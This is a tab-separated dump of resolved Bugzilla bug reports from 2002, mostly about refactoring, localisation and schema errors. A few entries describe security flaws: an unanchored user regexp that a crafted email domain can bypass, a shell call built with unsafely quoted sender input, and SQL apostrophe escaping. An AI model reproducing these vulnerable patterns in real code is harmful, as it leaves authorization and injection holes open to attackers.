161402%TAB%1028654582%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Email Notifications%TAB%Disable DBI taint mode in processmail%TAB%Disable DBI taint mode in processmailDBI has a taint setting, where data coming into DBI is checked, and data going out is marked as tainted. This is enabled in processmail only.  We already manually check data going into the db. Stuff coming from the db is a problem, because:  a) this is only done in processmail b) its useless  Seriously, we have to trust what comes out of the database - theres really no point if we don't. And adding trick_taint calls to every single db query strikes me as a useless waste of time.  So I'd like to remove the stuff from processmail.
161450%TAB%1028680251%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%New search knob causes warnings%TAB%New search knob causes warningsUse of uninitialized value in numeric eq (==) at         /var/www/bugzilla/tip/buglist.cgi line 296 (#1)     (W uninitialized) An undefined value was used as if it were already     defined.  It was interpreted as a "" or a 0, but maybe it was a mistake.     To suppress this warning assign a defined value to your variables.      To help you figure out what was undefined, perl tells you what operation     you used the undefined value in.  Note, however, that perl optimizes your     program and the operation displayed in the warning may not necessarily     appear literally in your program.  For example, "that $foo" is     usually optimized into "that " . $foo, and the warning will refer to     the concatenation (.) operator, even though there is no . in your     program.  [Wed Aug  7 12:14:06 2002] buglist.cgi: Use of uninitialized value in numeric eq (==) at /var/www/bugzilla/tip/buglist.cgi line 296. [Wed Aug  7 12:14:06 2002] buglist.cgi: Use of uninitialized value in numeric eq (==) at /var/www/bugzilla/tip/buglist.cgi line 296.
161865%TAB%1028848332%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%GetFieldID shouldn't INSERT into the fielddefs table%TAB%GetFieldID shouldn't INSERT into the fielddefs tableThis has been bothering me for a while.  GetFieldID has the interesting habit of inserting entries if it can't find them. This leads to bugs like bug 157505, plus another similar one we had recently which I can't seem to find. This is also caueing problems when I try to work out where an extra entry is coming from in my patch for bug 43600.  I've got a patch which converts this into a die (not a template error, since this could come from anywhere really) and adds fielddefs which aren't in checksetup.pl to the list to be created there.
161974%TAB%1028891382%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Need a "Localizers Guide"%TAB%Need a "Localizers Guide"Several people want to localise Bugzilla; we need to gather together the information about how to do it, and best practice.
162046%TAB%1028930548%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%HEAD Broken - new Bugzilla/Search.pm error%TAB%HEAD Broken - new Bugzilla/Search.pm errorSoftware error:  Undefined subroutine &Bugzilla::Search::SqlQuote called at Bugzilla/Search.pm line 848.  (Triggerred by queries on substring in summary)
162060%TAB%1028943515%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%votestoconfirm must die,decouple votestoconfirm and unconfirmed%TAB%votestoconfirm must die,decouple votestoconfirm and unconfirmedOne of our most FAQs is "how do I turn on unconfirmed"? The current method (set votestoconfirm to non-zero) is not very intuitive. Also, confirming by popular vote has only ever been done on a handful of bugs on b.m.o.  We should remove this feature, and replace it with a simple "enable UNCONFIRMED" checkbox for each product.
162066%TAB%1028954907%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Fix callers of ThrowCodeError to use messages.html.tmpl,Fix callers of ThrowCodeError to use messages in code-error.html.tmpl%TAB%Fix callers of ThrowCodeError to use messages.html.tmpl,Fix callers of ThrowCodeError to use messages in code-error.html.tmplThere are six callers of ThrowCodeError. We need to move the strings into the messages.html.tmpl template for l10n reasons.
162068%TAB%1028956152%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Fix callers of ThrowUserError to use messages.html.tmpl%TAB%Fix callers of ThrowUserError to use messages.html.tmplWe need to fix the callers of ThrowUserError so their strings get moved into the templates.
162151%TAB%1029025038%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Fix page.cgi's method of finding templates%TAB%Fix page.cgi's method of finding templatesCurrently, page.cgi gets its template mappings from localconfig. This is bad, because new installations don't pick up new mappings.  The new idea is to have a template/en/default/pages directory. This contains all the pages page.cgi can serve.  page.cgi?id=foo.html will look up "html" in the %contenttypes hash, send the appropriate content type, then look for foo.html.tmpl in the pages directory.
162194%TAB%1029060478%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%DOCTYPE should include system identifier%TAB%DOCTYPE should include system identifierThe current DOCTYPE causes Mozilla to use the quirks mode. Adding the system identifier it would render in "Almost Standards Mode" (see URL). Additional it is good habit to include the URL to the DTD file anyway.
162216%TAB%1029070198%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%colchange.cgi, buglist.cgi and page.cgi messages should be l10nable%TAB%colchange.cgi, buglist.cgi and page.cgi messages should be l10nablecolchange.cgi, buglist.cgi and page.cgi should use global/messages.html.tmpl to localize the messages.
162217%TAB%1029070579%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%./checksetup.pl: Warning after pulldown menu support in defparams.pl%TAB%./checksetup.pl: Warning after pulldown menu support in defparams.plAfter bug 160410 has been checked in I get this warning when running ./checksetup.pl: Checking user setup ... Use of uninitialized value in string eq at globals.pl line 1443 (#1)     (W uninitialized) An undefined value was used as if it were already     defined.  It was interpreted as a "" or a 0, but maybe it was a mistake.     To suppress this warning assign a defined value to your variables.          To help you figure out what was undefined, perl tells you what operation     you used the undefined value in.  Note, however, that perl optimizes your     program and the operation displayed in the warning may not necessarily     appear literally in your program.  For example, "that $foo" is     usually optimized into "that " . $foo, and the warning will refer to     the concatenation (.) operator, even though there is no . in your     program.      [Sun Aug 11 23:45:49 2002] checksetup.pl: Use of uninitialized value in string eq at globals.pl line 1443. [Sun Aug 11 23:45:49 2002] checksetup.pl: Use of uninitialized value in string eq at globals.pl line 1443.
162313%TAB%1029131098%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts,Documentation%TAB%possible security issue with useregexps%TAB%possible security issue with useregexpsGroups have userregexps for the defaults to use for new users. This is overkill (bug 162331), but its also a security hole.  Given a userregexp of |.*@foo.com|, I can match that with an address of bbaetz@foo.com.my.server.com.au. This is because there isn't any ^ or $ wrapping in InsertNewUser.  What are bmo's regexps set to? :) landfill's are buggy this way....  This could arguably be called a error on the part of the admin, but since we don't give any examples.... ^ wrapping is probably going to break stuff, but $ shouldn't. Alternately, we can just have checksetup prepent ^.* and append $, and then update the help text so that admins can see what went wrong.  I tested this locally by modifying /etc/hosts to make 127.0.0.1 an alias for bluemartini.com.localhost, and it worked.
162359%TAB%1029153839%TAB%44344%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation,Administration%TAB%Change wording on the cookiepath parameter%TAB%Change wording on the cookiepath parameterThe current description wording on the 'cookiepath' parameter confuses me.  "cookiepath: Directory path under your document root that holds your Bugzilla installation. Make sure to begin with a /."  The first thing that came to mind, was my "document root" at my FreeBSD box.. I'm not a FreeBSD/Linux geek, so I had no idea if the box had a "document root" at all.. Therefore I assumed that "document root" had to be the home directory of the user. My bugzilla installation runs as the user 'projects', so naturally, I installed bugzilla under /home/projects/bugzilla/, and thus set the cookiepath to point to that.  My bugzilla installation is accessed through http://bugzilla.domain.com/ .. so obviously this went wrong, and caused all my cookies to be invalid. So every time I made an action that required login, I had to login again. /Every/ time :)  I don't have a proposed wording.. The only thing I know, is that the words "directory path" and "document root" confused me, so please refrain from using those :) Use something that includes 'URL' or similar. "URL root" or something.
162438%TAB%1029194140%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Fix permissions for Bugzilla/ directory,Fix permissions and tests for Bugzilla/ directory%TAB%Fix permissions for Bugzilla/ directory,Fix permissions and tests for Bugzilla/ directoryWe added a new directory to the tree, but didn't do any of the fixPerms/htaccess stuff.
162642%TAB%1029283858%TAB%20977%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Cannot accept bugs if requiremilestone is on%TAB%Cannot accept bugs if requiremilestone is onIn an installation where I have requiremilestone parameter on, accepting a bug results in an SQL error:  SELECT defaultmilestone FROM products WHERE product = '': Unknown column 'produ ct' in 'where clause' at globals.pl line 277.  It seems that the schema update from bug 43600 changed the product varchar field to smallint id. The error comes (as far as I can tell) from the following line:
162854%TAB%1029394139%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%buglist.cgi: reporter is actually owner%TAB%buglist.cgi: reporter is actually ownerIf you display the bug reporter column in Bugzilla 2.17 the email address of the bug owner is shown instead of the email address of the reporter.
162990%TAB%1029439122%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%Shorthand/wildcard entry for login names in assign, cc, qa, fields%TAB%Shorthand/wildcard entry for login names in assign, cc, qa, fieldsFor sites where there are too many users to use dropdown lists for picking users in CC lists, assigned, and QA fields, a good way to enter lists of users without requiring exact and complete addresses is needed.  It should be possible to use an alternate form for any address so long as the alternate form matches exactly one login.  Imprecise or unmatchable alternate forms should cause an error page that gives the user an opportunity to correct the address and try again.  Alternate forms suggested... (suggesting + as an escape for special codes, * translating to a regexp of [^@]* )  +me --> the user doing the edit justdave@* --> any user with a username of justdave independent of domain ger*@*.org --> any user in a .org domain with a userid starting with "ger"  So it should be possible for a CC list to use
163007%TAB%1029450122%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%bugzilla accesskeys conflict with browser accesskeys%TAB%bugzilla accesskeys conflict with browser accesskeysI think these are the worst conflicts (from bug 159199 and bug 102648):  Access+D: Focus address bar in IE and soon in Mozilla (bug 157669). Access+B: Bookmarks in mozilla.  Individual bookmarks don't have accel combos, so this is an important menu access key. Access+A: Favorites in IE.  mpt said in bug 102648 comment 12 that dealing with conflicts is the job of the browser and not the web app because of localization, but I disagree.
163024%TAB%1029461931%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%bugzilla_email_append.pl calls processmail incorrectly%TAB%bugzilla_email_append.pl calls processmail incorrectlyBleh. Stupid enter key...  Anyway, as jussi pointed out in bug 160631, bugzilla_email_append.pl uses the same quoting that bug_email.pl used, which was fixed for bug 154008:  system("cd .. ; ./processmail $found_id '$SenderShort'");  is not the way to go. We should fix that....
163114%TAB%1029491766%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Templatise all calls to DisplayError%TAB%Templatise all calls to DisplayErrorDisplayError is deprecated; all calls to it need to be replaced with localisable calls to ThrowUserError(). There are approximately 115 of them; this will therefore be a tracking bug, as they get done in batches.
163290%TAB%1029615237%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Move DB handling code into a module%TAB%Move DB handling code into a moduleMove DB handling code into a module
163291%TAB%1029615401%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Move utility funcs into a module%TAB%Move utility funcs into a moduleMove utility funcs into a module
163299%TAB%1029626009%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Can't change cc accessible checkbox%TAB%Can't change cc accessible checkboxCan't change cc accessible checkbox
163331%TAB%1029649296%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%shutdownhtml is broken%TAB%shutdownhtml is brokenThe shutdownhtml code in CGI.pl processes message.html.tmpl directly, so it wasn't caught in the greps for the message i18n'ing.  Currently setting shutdownhtml fails with the error:  "You are using Bugzilla's error-reporting functions incorrectly. You passed in the string 'shutdown!'. The correct use is to pass in a tag, and define that tag in the file messages.html.tmpl.  If you are a Bugzilla end-user seeing this message, please save this page and send it to bbaetz@localhost."
163457%TAB%1029727820%TAB%52131%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration,Bugzilla Helper,Bugzilla-General%TAB%bugs not registered as "new"%TAB%bugs not registered as "new"User-Agent:       Mozilla/5.0 (Macintosh; U; PPC; en-US; rv:1.1) Gecko/20020814 MultiZilla/v1.1.20 Build Identifier: Mozilla/5.0 (Macintosh; U; PPC; en-US; rv:1.1) Gecko/20020814 MultiZilla/v1.1.20  I've been given the authorization to register bugs as "new" when using the helper form they get registered as "unconfirmed" in the old version my bugs started as "new"  If using the enter bug form, my bugs can start as "new"  Reproducible: Always  Steps to Reproduce:
163494%TAB%1029745160%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%runtests.sh needs a switch to include optional modules%TAB%runtests.sh needs a switch to include optional modulesRecently, HEAD has had incidents where checked-in code would not even compile but was not detected by runtests.sh or tinderbox  This seems to be because runtests.sh cannot presume that everyone has optional modules installed.   Runtests needs an option (which tinderbox should use) that assures it that all the optional module dependencies are satisfied and it should check all of the modules.
163541%TAB%1029763517%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%header.html.tmpl should set h1 be the empty string%TAB%header.html.tmpl should set h1 be the empty stringheader.html.tmpl currently doesn't let the primary page header (h1) be the empty string, because the DEFAULT directive thinks "" == undefined and sets h1 = title in that case.  This causes problems with, f.e. setting a title on the custom b.m.o index page without that title appearing as the primary page header.  header.html.tmpl should let the calling template specify that h1 is empty.
163570%TAB%1029775876%TAB%20977%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Search.pm calls time2str which is not found in the file%TAB%Search.pm calls time2str which is not found in the fileWhen using a '10d' type date in the 'were changed between' field, bugzilla reports the following error:  Undefined subroutine &Bugzilla::Search::time2str called at Bugzilla/Search.pm line 835.
163790%TAB%1029871745%TAB%63662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%colchange.cgi is not localisable%TAB%colchange.cgi is not localisablecolchange.cgi uses the names of the database columns directly.  Please  templatize this, so that when changes to the displayed names of fields/columns  are made in the table.html.tmpl, the same names can be displayed by  colchange.cgi.
163829%TAB%1029891785%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Move pref code into a separate package%TAB%Move pref code into a separate packageNeed to move the Param function (and localconfig vars) to a separate package. The versiontable stuff may wait until later; not sure about that. %::param may still be global, though, at least for the moment
163890%TAB%1029917482%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%editusers.cgi treats "_" (underscore) as a wildcard%TAB%editusers.cgi treats "_" (underscore) as a wildcardthis is because we're using sql LIKE stuff to simulate substr.... We should use substr directly, instead
164003%TAB%1029979049%TAB%25874%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Button "Add another boolean chart" appears twice after clicking "And"%TAB%Button "Add another boolean chart" appears twice after clicking "And"After entering an "Advanced Query" term and clicking "And", the query page gets two "Add another boolean chart" buttons.
164009%TAB%1029983198%TAB%25874%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%RFE: customizable hierarchical sorting,User Interface for setting query sort order,User Interface for setting buglist column sort order,User Interface for setting buglist sort order,Show which columns are being sorted on, in buglist.cgi, and what direction the sort is%TAB%RFE: customizable hierarchical sorting,User Interface for setting query sort order,User Interface for setting buglist column sort order,User Interface for setting buglist sort order,Show which columns are being sorted on, in buglist.cgi, and what direction the sort isI cannot sort hierarchically by "Assignee", "Priority", "Status".  Currently, when selecting e.g. "Sort results by: Assignee" on the query page, this gives a hierarchically sorted bug list. The hierarchy is remembered in the cookie "LASTORDER", which is set to "map_assigned_to.login_name%2C%20bugs.bug_status%2C%20bugs.priority%2C%20bugs.bug_id".  I could now probably edit the sorting hierarchy by editing the cookie file, but really great would be an UI in query.cgi, like: "Sort results by: <field1>, then <field2>, ..." This UI would show the current cookie content and allow to edit it.
164038%TAB%1029996760%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%token.cgi: Cancel token messages should be moved into the templates%TAB%token.cgi: Cancel token messages should be moved into the templatesAt the present all token cancel messages are in token.cgi (They are passed to Token::Cancel() and to the message.html.tmpl.
164307%TAB%1030098547%TAB%63662%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%CGI.pl not localisable%TAB%CGI.pl not localisableCGI.pl uses fixed strings for the UI, such as the prompt that it needs a  legitimate e-mail address and password to continue, and the labeling of the E- mail address and Password fields.  These should be templatized.
164464%TAB%1030204796%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,Bug Import/Export & Moving%TAB%Importxml will fail if versioncache needs update%TAB%Importxml will fail if versioncache needs updateimportxml tries to get the version table before connecting to the database.  This will fail if GetVersionTable needs to regenerate the version table.  GetVersionTable(); ConnectToDatabase();                             This is true in all the major branches.
164465%TAB%1030205959%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,Bug Import/Export & Moving%TAB%importxml.pl fails%TAB%importxml.pl failsimportxml.pl fails with..... importxml.pl: : Unknown column 'product' in 'field list' at globals.pl line 269, <> line 58.
164470%TAB%1030211587%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Mass reassign changes UNCONFIRMED->NEW%TAB%Mass reassign changes UNCONFIRMED->NEWMass reassign changes UNCONFIRMED->NEW
164566%TAB%1030305379%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Param and UserInGroup are not defined in Bugzilla::Search%TAB%Param and UserInGroup are not defined in Bugzilla::SearchSteps to Reproduce: - run a query against comments.  Result: Software Error:  Undefined subroutine &Bugzilla::Search::Param called at Bugzilla/Search.pm line 319. Undefined subroutine &Bugzilla::Search::UserInGroup called at Bugzilla/Search.pm line 319.  While we are at it, str2time in SqlifyDate requires a 'use Date::Parse' otherwise a similar error results for date related queries.  "Undefined subroutine &Bugzilla::Search::str2time called at Bugzilla/Search.pm line 851."
164572%TAB%1030310981%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Add .htaccess to Bugzilla/.cvsignore%TAB%Add .htaccess to Bugzilla/.cvsignoreAdd .htaccess to Bugzilla/.cvsignore
164623%TAB%1030339750%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%xml.cgi - attachments is broken and insiders not enforced%TAB%xml.cgi - attachments is broken and insiders not enforcedxml.cgi never prints an attachment and does not check isprivate  I don't see which line here fixes attachments (which aren't showing at all, currently)  Also, you can drop the regexp for $date, since the db now formats that in YYYY-MM-DD HH:MM:SS tome (since I changed the datatype a few weeks back)
165022%TAB%1030453724%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%add alias field to new bug form%TAB%add alias field to new bug formwe need to add an alias field to enter_bug.cgi. we have the bugzilla helper for newbies and I think it's time to make enter_bug more useful to developers and QA.
165025%TAB%1030454084%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%additions to enter_bug.cgi to make new bug form more powerful,add fields to enter_bug.cgi to make new bug form more useful%TAB%additions to enter_bug.cgi to make new bug form more powerful,add fields to enter_bug.cgi to make new bug form more usefulIn the old days there was a lot of pushback against making the new bug form more useful by adding fields for QA Contact, Keywords, dependencies, and status whiteboard (I've just added alias to the list). The justification for leaving these fields out of enter_bug.cgi was that we didn't want to complicate the interface for newbies.  Now we have a very good bugzilla helper and the interfaces are templatized so they are easier to adjust or swap out. I think it's time to revisit the decisions that have crippled enter_bug for frequent bug reporters. This is a metabug for tracking the changes to the new bug form which would make it not suck for power users.
165075%TAB%1030469201%TAB%16692%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla: Other b.m.o Issues,User Accounts,User Interface%TAB%[rfe] include login prompt on main page,Include login prompt on main page%TAB%[rfe] include login prompt on main page,Include login prompt on main page[rfe] include login prompt on main page,  Include login prompt on main page
165080%TAB%1030470928%TAB%54563%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Delete product fails with missing column error%TAB%Delete product fails with missing column errorUsing 13/8/2002 CVS snapshot of Bugzilla on Win32 (installation was upgraded from Bugzilla 2.14.2), when deleting a component 2 errors are generated relating to the missing column 'product_id' in products.  This is because 'product_id' appears to have been renamed to 'id'.  Correcting the SQL generated on lines ~637 and ~420 corrects the error.
165221%TAB%1030521906%TAB%64631%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%Apostrophes are not properly handled in e-mail addresses%TAB%Apostrophes are not properly handled in e-mail addressesMy proper e-mail address is Tim_O'Connor@instantiations.com. RFC822 is perfectly happy to allow me to have that apostrophe in my e-mail address but SQL is not. So I attempted to work around SQL by doubling the apostrophe. All's well and my account is accepted. I do not, however, receive any e-mail. Why? Because there is no e-mail account Tim_O''Connor@instantiations.com.  When taking an e-mail address from SQL Bugzilla should check for escaped characters (like the double apostrophe) and correct them.  I did not, by the way, try escaping the apostrophe with a back-slash as that's not normal SQL.
165366%TAB%1030561646%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration%TAB%When editparams is used to shutdown Bugzilla, provide a link back to editaparms,When editparams is used to shutdown Bugzilla, provide a link back to editparams%TAB%When editparams is used to shutdown Bugzilla, provide a link back to editaparms,When editparams is used to shutdown Bugzilla, provide a link back to editparamsCurrently, an admin who shuts down BZ using shutdownhtml is not offerred a link back to editaparms.cgi to wake the system back up.  doeditparams should probably put out a message like...  "Bugzilla has now been shut down, to re-enable the system, please return to <link>editparams.cgi</link>"
165589%TAB%1030631346%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Add log/syslog support to Bugzilla,Add error logging support to Bugzilla%TAB%Add log/syslog support to Bugzilla,Add error logging support to BugzillaBugzilla needs a capability to log "stuff" to either a local file or, selectably, to a (potentially remote) syslog.  Items of interest.... errors (with all the variables, etc... that caused them) access violations (with the IP and user info) mid-air collisions with the info on both changes and what was eventually done  This is for 2 purposes...  1) hack attempt detection (use syslog in case the hack is successfull) 2) responding to user complaints that some change did not "take"
165756%TAB%1030697667%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Suite%TAB%Running tests w/out checksetup.pl causes Config.pm to fail,tinderboxes need to run checksetup before tests,Running tests without checksetup causes failure%TAB%Running tests w/out checksetup.pl causes Config.pm to fail,tinderboxes need to run checksetup before tests,Running tests without checksetup causes failureRunning tests w/out checksetup.pl causes Config.pm to fail,  tinderboxes need to run checksetup before tests,  Running tests without checksetup causes failure
166016%TAB%1030842939%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup gives torrent of cryptic errors if my_webservergroup is not found%TAB%checksetup gives torrent of cryptic errors if my_webservergroup is not foundIf my_webservergroup is not a valid group, checksetup fails with a torrent of cryptic messages.
166023%TAB%1030846294%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%On failure in template->new, a template is used to display error%TAB%On failure in template->new, a template is used to display errorBugs such as bug 165133 show failures in checksetup that derive from the fact that globals.pl uses DisplayError() to show errors in Template->new    Since DisplayError() will never work if Template->new fails, this should be a die() instead.
166318%TAB%1031006544%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Bugzilla::Config should check for defparams.pl failure%TAB%Bugzilla::Config should check for defparams.pl failureIf defparams.pl is buggy, then Bugzilla::Config ignores the failures, leading to removal of all params (because they're all consdiered obsolete)  Error checking coming up
166346%TAB%1031025602%TAB%34853%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Reporting/Charting%TAB%set title attribute to bug summary for image maps in bug dependency graphs%TAB%set title attribute to bug summary for image maps in bug dependency graphsWhen webdotbase is set to a local executable, bugzilla will greate a client side image map for the dependency graph.  It would be nice if bugzilla output title attributes for these image maps so that the bug summaries are visible on mouse over.  This would give a nice compromise between not showing summaries (which gives a decent size dependency graph, but not much info), and showing the summaries (which makes the graph a lot bigger).
166481%TAB%1031080144%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Spellcheck is borked.%TAB%Spellcheck is borked.Spellcheck needs updates.  Firstly, I wanted to add new words:  paramater (parameter) (I saw this in a patch somewhere) existance (existence) (common) existant (existent)  When I tested this, I discovered that spellcheck wasn't finding these misspellings.  As it happens, only the first misspelling in the list is successfully located.  This seems to be because the file isn't being reopened between the misspellings.  Furthermore, spellcheck should check every file in the CVS tree for misspellings, including the documentation, not just Perl scripts.  You can exclude data and graphs, but everything else is fair game really.
166698%TAB%1031147419%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%The error system's in a bit of a mess%TAB%The error system's in a bit of a messThe error system's in a bit of a mess
166755%TAB%1031161136%TAB%65618%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup.pl gives inadequate error message for administrator password prompt%TAB%checksetup.pl gives inadequate error message for administrator password promptUser-Agent:       Mozilla/4.0 (compatible; MSIE 5.14; Mac_PowerPC) Build Identifier: irrelevant  checksetup.pl's error message for the administrator password prompt does not explain why it is rejecting a non-zero-length password.  Reproducible: Always  Steps to Reproduce: 1.Perform initial install of bugzilla 2.Run checksetup.pl 3.At administrator password prompt, enter, for example, a string containing a period, space, or special character  Actual Results:   Endless loop of The password must be 3-16 characters in length. Followed by frustrated read of perl code to determine problem.  Expected Results:   Given the error message proposed in the diff below, or accepted a more complex set of characters.  Here is a proposed solution, presented as a diff:  % diff bugzilla-2.16/checksetup.pl revised-checksetup.pl 1993c1993 <           print "The password must be 3-16 characters in length."; ---
166766%TAB%1031164670%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Spelling errors.%TAB%Spelling errors.Spelling errors.
166821%TAB%1031195256%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%reports.cgi broken by recent schema changes%TAB%reports.cgi broken by recent schema changesSELECT defaultmilestone FROM products WHERE product = 'FoodReplicator': Unknown column 'product' in 'where clause' at globals.pl line 250.
166928%TAB%1031227180%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%index.cgi needs to be added to the DirectoryIndex directive in Apache%TAB%index.cgi needs to be added to the DirectoryIndex directive in ApacheThe documentation in section 4.1.6 on HTTPD server gives several configuration items that need to be adjusted in your httpd.conf file.  Missing from that list is to make sure that the DirectoryIndex directive contains a reference to index.cgi (it usually doesn't on a default Apache install)  So it'll end up looking something like this:  DirectoryIndex index.html index.htm index.shtml index.php index.cgi
167379%TAB%1031472383%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%LDAP docs%TAB%LDAP docsThis is from the newsgroup; I don't want to lose it, because we should document that LDAP can be made to work this way.  Gerv  I'm not sure about iPlanet but I have successfully integrated Bugzilla 2.16 with OpenLDAP 2.0.23.  I'm using Directory Administrator from http://diradmin.open-it.org/ and Softerra LDAP Administrator from http://www.softerra.com/ to maintain users (although iPlanet probably has this functionality built-in).  I also applied the following patch to cgi.pl because I already had Net::LDAP installed and operational:  http://bugzilla.mozilla.org/show_bug.cgi?id=158630  That's all that was required for it to work.  I'm using the following objectClasses for users...perhaps that's where your problem may lie:  objectClass: person objectClass: organizationalPerson objectClass: inetOrgPerson objectClass: top objectClass: posixAccount objectClass: shadowAccount  /Sean/  "Sanjay Vaid" <Sanjay.Vaid@sbs.be> wrote in message news:ajbf9t$p0g$1@news.mch.sbs.de...
167476%TAB%1031539487%TAB%66241%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%unix_timestamp conversion error using MySQL%TAB%unix_timestamp conversion error using MySQLLine 275 in reports.cgi generated for linux/mysql. Bugzilla version 1.14.1.  reads: unix_timestamp(date_format(bugs.creation_ts, '%Y-%m-%d %h:%m:%s'))  There is a simple error converting the minutes using %m which reference months. Should have been %i.  This part of the SQL-sentence does not take into account european formated dates running from 0-23 - in mysql not %h, but %H; nor does it take into account use of 0-11 clocks using AM/PM formated strings by adding %p.  The correct string for 0-23 hour clock: '%Y-%m-%d %H:%i:%s'  The correct string for 0-11 hour clock: '%Y-%m-%d %h:%i:%s %p'
167485%TAB%1031543757%TAB%60430%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%When "usebuggroups" is on, then assigning of group_id is not optimum,When "usebuggroups" is on, then assigning of group_id is in error%TAB%When "usebuggroups" is on, then assigning of group_id is not optimum,When "usebuggroups" is on, then assigning of group_id is in errorI was going through the code of bugzilla. There in "editproducts.cgi" file, I  found that when any product is updated then if "usebuggroups" is on then group  is created if group already does not exist.  While creating the new group, double of the max availble bit is being done.  Which is not proper as if some one deletes any group OR product then that free  bit remains unused.  In the file "editgroups.cgi", bit for new group is taken in optimum way as it  first check for any free available bit, before trying for 2*max(bit).  I think this code must be used whenever any group is being created.  code in editproducts.cgi ==== code ==========             # Group doesn't exist.  Let's make it, the same way as we make a             # group for a new product above.             SendSQL("SELECT MAX(bit) FROM groups");             my $tmp_bit = FetchOneColumn();             if($tmp_bit < 256) {                 $bit = 256;             } else {                 $bit = $tmp_bit * 